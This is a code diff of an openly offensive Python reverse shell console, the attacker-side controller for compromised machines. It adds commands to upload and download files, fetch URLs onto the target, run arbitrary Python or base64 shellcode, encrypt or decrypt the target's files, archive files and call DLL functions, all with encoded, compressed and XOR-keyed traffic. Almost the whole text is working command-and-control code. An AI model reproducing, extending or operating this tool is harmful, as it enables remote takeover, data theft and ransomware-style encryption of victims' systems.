@@ -24,7 +24,7 @@ This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.7"
+__version__ = "0.1.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -59,29 +59,108 @@ __all__ = [
 print(copyright)
 
 from cmd import Cmd
-from sys import exit
 from socket import socket
+from sys import exit, stderr
 from functools import partial
+from re import compile as regex
 from contextlib import suppress
-from os.path import split, splitext
+from urllib.parse import urlparse
 from random import randint, choices
 from collections.abc import Callable
-from shlex import split as shellsplit
 from json import JSONDecodeError, loads
 from platform import system as platform
 from string import ascii_letters, digits
+from os.path import split, splitext, exists
 from os import urandom, name, system as shell
-from typing import TypeVar, List, Dict, Tuple
 from argparse import ArgumentParser, Namespace
-from base64 import b64encode, b64decode, b16decode, b16encode
+from typing import TypeVar, List, Dict, Tuple, Union
+from bz2 import compress as bz2, decompress as unbz2
+from gzip import compress as gzip, decompress as ungzip
+from lzma import compress as lzma, decompress as unlzma
+from zlib import compress as zlib, decompress as unzlib
 from ssl import SSLContext, PROTOCOL_TLS_SERVER, SSLWantReadError
 from socketserver import BaseRequestHandler, UDPServer, TCPServer
+from shlex import split as shellsplit, join as shelljoin, quote as shellquote
+from base64 import (
+    b85decode,
+    b85encode,
+    b64encode,
+    b64decode,
+    b32encode,
+    b32decode,
+    b16encode,
+    b16decode,
+)
 
 from PythonToolsKit.Encodings import decode_data
+from PythonToolsKit.PrintF import printf
 
 Json = TypeVar("Json", dict, list, str, int, float, bool)
 alphanum: bytes = ascii_letters.encode() + b"_" + digits.encode()
 letters: bytes = ascii_letters.encode()
+
+base64regex = regex(
+    r"^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$"
+)
+
+
+def is_filepath(filename: str, is_windows: bool = None) -> Union[bool, None]:
+    """
+    This function checks filename validity.
+
+    >>> is_filepath('abc', True)
+    True
+    >>> is_filepath(r'C:\\abc\\test.txt', True)
+    True
+    >>> is_filepath('/abc/test.txt', False)
+    True
+    >>> is_filepath(r'<abc>|*/\\"', True)
+    False
+    >>> print(is_filepath('/abc,/<>', False))
+    None
+    >>>
+    """
+
+    if (
+        is_windows
+        and any(x in filename for x in '"<>|*?')
+        or ":" == filename[0]
+        or ":" in filename[2:]
+    ):
+        return False
+    elif any(
+        x
+        not in "0123456789abcdefghijklmnopqrstuvwx"
+        "yzABCDEFGHIJKLMNOPQRSTUVWXYZ-./_\\:"
+        for x in filename
+    ):
+        return None
+
+    return True
+
+
+def confirm(message: str) -> bool:
+    """
+    This function asks to continue.
+    """
+
+    printf(
+        message + " [Y/N/y/n/yes/no/YES/NO] : ",
+        state="ASK",
+        end="",
+    )
+    response = input().casefold()
+    while response not in ("y", "n", "yes", "no"):
+        printf(
+            message + " [Y/N/y/n/yes/no/YES/NO] : ",
+            state="ASK",
+            end="",
+        )
+        response = input().casefold()
+
+    if response in ("y", "yes"):
+        return True
+    return False
 
 
 class ReverseShell(Cmd, BaseRequestHandler):
@@ -103,6 +182,10 @@ class ReverseShell(Cmd, BaseRequestHandler):
     target_is_windows: bool = None
     is_windows: bool = name == "nt"
     encoding: str = "utf-8" if name != "nt" else "cp437"
+    decode: Callable = lambda x, y: y
+    decompress: Callable = decode
+    encode: Callable = decode
+    compress: Callable = decode
 
     def __init__(
         self,
@@ -111,7 +194,7 @@ class ReverseShell(Cmd, BaseRequestHandler):
         encoding: str = None,
     ):
         self.encoding = encoding or self.encoding
-        self.key = key and self.init_key(key)
+        self.key = getattr(self, "key", None) or key and self.init_key(key)
         Cmd.__init__(self)
         BaseRequestHandler.__init__(self, *args)
 
@@ -154,19 +237,66 @@ class ReverseShell(Cmd, BaseRequestHandler):
         data = self.parse_data(data)
 
         if data:
-            print(data)
+            self.use_data(data)
+            self.__class__.use_data = self.__class__.default_use_data
             self.cmdloop()
+
+    def use_data(self, data: str):
+        """
+        This function uses received data and should be overwritten for
+        custom behaviour in builtins commands.
+        """
+
+        print(data)
+
+    default_use_data = use_data
 
     def defined_context(self, data: Dict[str, Json]) -> None:
         """
         This function sets context.
         """
 
-        self.hostname = hostname = data.get("hostname", self.client_address[0])
-        self.user = user = data.get("user", "user")
-        self.current_directory = cwd = data.get("cwd", "~")
-        self.__class__.target_system = system = data.get("system", platform())
-        self.__class__.target_is_windows = is_windows = system == "Windows"
+        self.__class__.hostname = hostname = data.get(
+            "hostname", getattr(self, "hostname", self.client_address[0])
+        )
+        self.__class__.user = user = data.get("user", getattr(self, "user", "user"))
+        self.__class__.current_directory = cwd = data.get(
+            "cwd", getattr(self, "current_directory", "~")
+        )
+        self.__class__.target_system = system = data.get(
+            "system", getattr(self, "target_system", platform())
+        )
+        self.__class__.target_is_windows = is_windows = system.casefold() == "windows"
+        encoding = data.get("encoding")
+        compression = data.get("commpression")
+
+        if (
+            encoding
+            and encoding.startswith("base")
+            and encoding[-2:].isdigit()
+        ):
+            globals_ = globals()
+            decode = globals_["b" + encoding[-2:] + "decode"]
+            encode = globals_["b" + encoding[-2:] + "encode"]
+            self.__class__.decode = lambda x, y: decode(y)
+            self.__class__.encode = lambda x, y: encode(y)
+
+        if compression in ("gzip", "lzma", "zlib", "bz2"):
+            globals_ = globals()
+            compress = globals_[compression]
+            decompress = globals_["un" + compression]
+            self.__class__.compress = lambda x, y: compress(y)
+            self.__class__.decompress = lambda x, y: decompress(y)
+
+        key = self.decompress(self.decode(data.get("key", "").encode()))
+
+        if key and self.key:
+            key_base = self.key
+            key_length = len(self.key)
+            del self.key
+            self.__class__.key = bytes(
+                [key_base[i % key_length] ^ char for i, char in enumerate(key)]
+            )
 
         if is_windows:
             self.__class__.encoding = "cp437"
@@ -184,8 +314,12 @@ class ReverseShell(Cmd, BaseRequestHandler):
             else f"{hostname}@{user}:{cwd}$ "
         )
 
-        self.__class__.executables = executables = data.get("executables", [])
-        self.__class__.files = files = data.get("files", [])
+        self.__class__.executables = executables = data.get(
+            "executables", getattr(self, "executables", self.executables)
+        )
+        self.__class__.files = files = data.get(
+            "files", getattr(self, "files", self.files)
+        )
         ReverseShell._set = True
 
         if not is_windows:
@@ -246,12 +380,12 @@ class ReverseShell(Cmd, BaseRequestHandler):
 
     completedefault = completenames
 
-    def default(self, arg: str, check: bool = True) -> None:
+    def default(self, argument: str, check: bool = True) -> None:
         """
         This method sends data to socket shell client.
         """
 
-        command_splitted = shellsplit(arg)
+        command_splitted = shellsplit(argument)
         if (
             check
             and command_splitted
@@ -271,6 +405,10 @@ class ReverseShell(Cmd, BaseRequestHandler):
                         "if",
                         "echo",
                         "for",
+                        "type",
+                        # "install_agent",
+                        "python3_exec_file",
+                        "python3_exec_file_compress",
                         *self.executables,
                         *self.files,
                     )
@@ -305,29 +443,24 @@ class ReverseShell(Cmd, BaseRequestHandler):
                         "]]",
                         "coproc",
                         "compgen",
+                        # "install_agent",
+                        "python3_exec_file_compress",
                         *self.executables,
                         *self.files,
                     )
                 )
             )
         ):
-            confirm = input(
-                "Executable not found, are you sure you want"
-                " send it ? [Y/N/yes/no] "
-            ).casefold()
-            while confirm not in ("y", "n", "yes", "no"):
-                confirm = input(
-                    "Executable not found, are you sure you want"
-                    " send it ? [Y/N/yes/no] "
-                ).casefold()
-            if confirm in ("n", "no"):
+            if not confirm(
+                "Executable not found, are you sure you want send it ?"
+            ):
                 self.cmdloop()
                 return None
 
         if self.key:
-            data = self.encrypt(arg.encode(self.encoding))
+            data = self.encrypt(argument.encode(self.encoding))
         else:
-            data = arg.encode(self.encoding)
+            data = argument.encode(self.encoding)
 
         self.sender(data)
 
@@ -343,7 +476,7 @@ class ReverseShell(Cmd, BaseRequestHandler):
 
     if is_windows:
 
-        def do_cls(self, arg: str) -> bool:
+        def do_cls(self, argument: str) -> bool:
             """
             This method clear console on windows.
             """
@@ -354,7 +487,7 @@ class ReverseShell(Cmd, BaseRequestHandler):
 
     else:
 
-        def do_clear(self, arg: str) -> bool:
+        def do_clear(self, argument: str) -> bool:
             """
             This method clear console on windows.
             """
@@ -363,14 +496,616 @@ class ReverseShell(Cmd, BaseRequestHandler):
             self.cmdloop()
             return None
 
-    def do_quit(self, arg: str) -> bool:
+    # def do_install_agent(self, arguments: str) -> bool:
+    #     """
+    #     This method executes a python file to install
+    #     an agent on the target.
+    #     """
+
+    #     from ShellClients import get_commands_install
+
+    #     self.default(";".join(get_commands_install(split(arguments))))
+    #     return False
+
+    def do_cd(self, argument: str) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        # arguments = shellsplit(argument)
+        # if len(arguments) > 1:
+        #     command = shelljoin(["cd", argument])
+        #     command_repr = repr(command)
+        #     printf(
+        #         "Invalid command detected for 'cd' command.",
+        #         state="ERROR",
+        #         file=stderr,
+        #     )
+        #     printf("Do you want to send: " + command_repr + " ?", state="ASK")
+        #     response = ""
+        #     while response.casefold() not in ("yes", "y", "n", "no"):
+        #         response = input(
+        #             "[YES/yes/y/Y]: to send the new command ("
+        #             + command_repr
+        #             + "), [NO/no/n/N]: don't send the command: "
+        #         )
+        #     if response in ("yes", "y"):
+        #         self.default(command)
+        #     else:
+        #         self.cmdloop()
+        # elif len(arguments) < 1:
+        #     printf(
+        #         "Invalid command detected for 'cd' command."
+        #         " First argument is required.",
+        #         state="ERROR",
+        #         file=stderr,
+        #     )
+        #     self.cmdloop()
+        if not len(argument):
+            printf(
+                "Invalid command detected for 'cd' command."
+                " First argument is required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: cd raw directory path",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif is_filepath(argument, self.target_is_windows) is False:
+            printf(
+                "Invalid directory path detected for 'cd' command.",
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif is_filepath(argument, self.target_is_windows) is None:
+            printf(
+                "Probably invalid directory path detected for 'cd'"
+                " command. This is not a shell syntax all characters after "
+                "'cd ' string is the raw directory path.",
+                state="NOK",
+                file=stderr,
+            )
+            if not confirm(
+                "Are you sure this is the directory "
+                "path, do you want to send it ?"
+            ):
+                self.cmdloop()
+            else:
+                self.default("cd " + argument)
+        else:
+            self.default("cd " + argument)
+        return False
+
+    def do_upload_file(self, argument: str, compress: bool = False) -> bool:
+        """
+        This method uploads a file on the target.
+        """
+
+        send = False
+        arguments = shellsplit(argument)
+        if len(arguments) != 2:
+            printf(
+                "Invalid command detected for 'upload_file' command."
+                " First and second are required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: upload_file [source filename] [destination filename]",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif (
+            is_filepath(arguments[1], self.target_is_windows) is False
+            or is_filepath(arguments[0], self.is_windows) is False
+        ):
+            printf(
+                "Invalid filename detected for 'upload_file' command.",
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif not exists(arguments[0]):
+            printf(
+                "Source file not found for 'upload_file' command.",
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif is_filepath(arguments[1], self.target_is_windows) is None:
+            printf(
+                "Probably invalid filename detected for "
+                "'upload_file' command.",
+                state="NOK",
+                file=stderr,
+            )
+            if not confirm(
+                "Are you sure this is the filename, do you want to send it ?"
+            ):
+                self.cmdloop()
+            else:
+                send = True
+        else:
+            send = True
+
+        if not send:
+            return False
+
+        file = open(arguments[0], "rb")
+        if compress:
+            data = self.encode(self.compress(file.read()))
+        else:
+            data = self.encode(file.read())
+        file.close()
+        self.default("upload_file" + ("_compress " if compress else " ") + shellquote(arguments[1]) + " " + data.decode("latin-1"))
+        return False
+
+    def do_upload_file_compress(self, argument: str) -> bool:
+        """
+        This method uploads a compressed file on the target.
+        """
+
+        return self.do_upload_file(argument, True)
+
+    def use_data_download(self, data: str) -> None:
+        """
+        This method is used for download file commands.
+        """
+
+        with open(self.download_filename, 'wb') as file:
+            file.write(self.decode(data.encode()))
+
+        print("done")
+
+    def do_download_file(self, argument: str, compress: bool = False) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        send = False
+        if not len(argument):
+            printf(
+                "Invalid command detected for 'download_file' command."
+                " Arguments are required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: download_file raw filename", state="INFO", file=stderr
+            )
+            self.cmdloop()
+        elif is_filepath(argument, self.target_is_windows) is False:
+            printf(
+                "Invalid filename detected for 'download_file' command.",
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif is_filepath(argument, self.target_is_windows) is None:
+            printf(
+                "Probably invalid filename detected for 'download_file'"
+                " command. This is not a shell syntax all characters after "
+                "'download_file ' string is the raw filename.",
+                state="NOK",
+                file=stderr,
+            )
+            if not confirm(
+                "Are you sure this is the filename, do you want to send it ?"
+            ):
+                self.cmdloop()
+            else:
+                send = True
+        else:
+            send = True
+
+        self.__class__.download_filename = argument
+        self.__class__.use_data = self.__class__.use_data_download
+        if send and compress:
+            self.default("download_file_compress " + argument)
+        elif send:
+            self.default("download_file " + argument)
+        return False
+
+    def do_download_url(self, argument: str) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        arguments = shellsplit(argument)
+        arguments_length = len(arguments)
+        url = arguments_length and urlparse(arguments[0])
+        send = False
+        if arguments_length != 1 and arguments_length != 2:
+            printf(
+                "Invalid command detected for 'download_url' command."
+                " Arguments are required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: download_url [URL] (optional:filename)", state="INFO", file=stderr
+            )
+            self.cmdloop()
+        elif not url.netloc or not url.scheme:
+            printf(
+                "Invalid URL detected for 'download_url' command.",
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif arguments_length == 2 and is_filepath(arguments[1], self.target_is_windows) is False:
+            printf(
+                "Invalid filename detected for 'download_url' command.",
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif arguments_length == 2 and is_filepath(arguments[1], self.target_is_windows) is None:
+            printf(
+                "Probably invalid filename detected for 'download_url'"
+                " command.",
+                state="NOK",
+                file=stderr,
+            )
+            if not confirm(
+                "Are you sure this is the filename, do you want to send it ?"
+            ):
+                self.cmdloop()
+            else:
+                send = True
+        else:
+            send = True
+
+        if send:
+            self.default(shelljoin(("download_url", *arguments)))
+
+        return False
+
+    def do_download_file_compress(self, argument: str) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        return self.do_download_file(argument, True)
+
+    def do_python3_exec(self, argument: str, compress: bool = False) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        if len(argument):
+            if compress:
+                self.default(
+                    "python3_exec_compress "
+                    + self.encode(self.compress(argument.encode())).decode()
+                )
+            else:
+                self.default("python3_exec " + argument)
+        else:
+            printf(
+                "Invalid command detected for 'python3_exec' command."
+                " Arguments are required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: python3_exec raw python code",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+        return False
+
+    def do_python3_exec_file(
+        self, argument: str, compress: bool = False
+    ) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        if exists(argument):
+            if compress:
+                file = open(argument, "rb")
+                script = self.encode(self.compress(file.read())).decode(
+                    "latin-1"
+                )
+            else:
+                file = open(argument, "r", encoding="latin-1")
+                script = file.read()
+            file.close()
+            self.default(
+                "python3_exec" + ("_compress " if compress else " ") + script
+            )
+        elif not len(argument):
+            printf(
+                "Invalid command detected for 'python3_exec_file' command."
+                " First argument is required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: python3_exec_file [python script filename]",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+        else:
+            printf(
+                "Source file not found for 'python3_exec_file' command. "
+                "Arguments are a raw filename this is not a shell systax",
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        return False
+
+    def do_python3_exec_compress(self, argument: str) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        return self.do_python3_exec(argument, True)
+
+    def do_python3_exec_file_compress(self, argument: str) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        return self.do_python3_exec_file(argument, True)
+
+    def do_shellcode(self, argument: str, compress: bool = False) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        if not len(argument):
+            printf(
+                "Invalid command detected for 'shellcode' command."
+                " First argument is required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: shellcode [shellcode base64-encoded]",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif base64regex.match(argument) is None:
+            printf(
+                "Invalid syntax detected for 'shellcode' command."
+                " Shellcode (first argument) must be base64-encoded.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: shellcode [shellcode base64-encoded]",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+        else:
+            if compress:
+                self.default(
+                    "shellcode_compress "
+                    + self.encode(self.compress(b64decode(argument.encode()))).decode()
+                )
+            else:
+                self.default(
+                    "shellcode " + self.encode(b64decode(argument.encode())).decode()
+                )
+        return False
+
+    def do_shellcode_compress(self, argument: str) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        return self.do_shellcode(argument, True)
+
+    def do_encrypt_files(
+        self, argument: str, onefile: bool = False, decrypt: bool = False
+    ) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        send = False
+        arguments = shellsplit(argument)
+        if len(arguments) < 2:
+            printf(
+                "Invalid command detected for 'encrypt_files' command."
+                " Minimum 2 arguments are required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: encrypt_files [key] [filename1] "
+                "[filename2] ... [filenameX]",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif onefile and len(arguments) != 2:
+            printf(
+                "Invalid command detected for 'encrypt_file' command."
+                " Only 2 arguments are required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: encrypt_file [key] [filename]",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif (
+            onefile
+            and is_filepath(arguments[1], self.target_is_windows) is False
+        ):
+            printf(
+                "Invalid filename detected for 'encrypt_file' command.",
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif (
+            onefile
+            and is_filepath(arguments[1], self.target_is_windows) is None
+        ):
+            printf(
+                "Probably invalid filename detected for "
+                "'encrypt_file' command.",
+                state="NOK",
+                file=stderr,
+            )
+            if not confirm(
+                "Are you sure this is the filename, do you want to send it ?"
+            ):
+                self.cmdloop()
+            else:
+                send = True
+        else:
+            send = True
+
+        if send and onefile:
+            self.default(
+                ("decrypt" if decrypt else "encrypt") + "_file " + argument
+            )
+        elif send:
+            self.default(
+                ("decrypt" if decrypt else "encrypt") + "_files " + argument
+            )
+        return False
+
+    def do_encrypt_file(self, argument: str) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        return self.do_encrypt_files(argument, True)
+
+    def do_decrypt_files(self, argument: str) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        return self.do_encrypt_files(argument, False, True)
+
+    def do_decrypt_file(self, argument: str) -> bool:
+        """
+        This method quits the reverse shell.
+        """
+
+        return self.do_encrypt_files(argument, True, True)
+
+    def do_archive_files(self, argument: str) -> bool:
+        """
+        This method sends command to archive files from multiples glob syntax.
+        """
+
+        arguments = shellsplit(argument)
+        arguments_length = len(arguments)
+        archive_name = arguments_length and arguments[0]
+        if arguments_length > 1 and any(
+            archive_name.endswith(x)
+            for x in (".zip", ".tar", ".tar.gz", ".tar.bz2", ".tar.xz")
+        ):
+            self.default("archive_files " + argument)
+        elif arguments_length > 1:
+            printf(
+                "Invalid extension for archive name. Extension must be: "
+                "'.zip', '.tar', '.tar.gz', '.tar.bz2' or '.tar.xz'",
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        else:
+            printf(
+                "Invalid command detected for 'archive_files' command."
+                " Arguments are required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: archive_files [archive name] [match file 1] "
+                "[match file 2] ... [match file N]",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+
+        return False
+
+    def do_call_library_function(self, argument: str) -> bool:
+        """
+        This method sends command to calls DLL function.
+        """
+
+        c_types = [
+            "bool:",
+            "byte:",
+            "char:",
+            "char *:",
+            "double:",
+            "float:",
+            "long:",
+            "long long:",
+            "short:",
+            "unsigned byte:",
+            "unsigned long:",
+            "unsigned long long:",
+            "unsigned short:",
+            "void *:",
+            "wchar:",
+            "wchar *:",
+        ]
+
+        arguments = shellsplit(argument)
+        if len(arguments) < 2:
+            printf(
+                "Invalid command detected for 'call_library_function' command."
+                " Minimum 2 arguments are required.",
+                state="ERROR",
+                file=stderr,
+            )
+            printf(
+                "USAGE: call_library_function [DLL name or path] "
+                "[function] [argument1 type:value] [argument2 type:value]"
+                " ... [argumentN type:value]",
+                state="INFO",
+                file=stderr,
+            )
+            self.cmdloop()
+        elif any(
+            not any(x.startswith(t) for t in c_types) for x in arguments[2:]
+        ):
+            printf(
+                "Invalid argument type detected."
+                " Function arguments must be in this format: 'type:value'."
+                " Where type must be in: "
+                + ", ".join(repr(t)[:-1] for t in c_types),
+                state="ERROR",
+                file=stderr,
+            )
+            self.cmdloop()
+        else:
+            self.default("call_library_function " + argument)
+        return False
+
+    def do_quit(self, argument: str) -> bool:
         """
         This method quits the reverse shell.
         """
 
         return True
 
-    def do_exit(self, arg: str) -> bool:
+    def do_exit(self, argument: str) -> bool:
         """
         This method exits the reverse shell.
         """
@@ -663,7 +1398,9 @@ class HttpReverseShell(ReverseShell):
             self.sender = lambda x: sender(
                 b"HTTP/1.0 200 OK\r\nContent-Type: {type}\r\n".replace(
                     b"{type}",
-                    b"octect/stream" if self.key else b"text/plain; charset=utf-8",
+                    b"octect/stream"
+                    if self.key
+                    else b"text/plain; charset=utf-8",
                 )
                 + b"Content-Length: {length}\r\n\r\n".replace(
                     b"{length}", str(len(x)).encode()
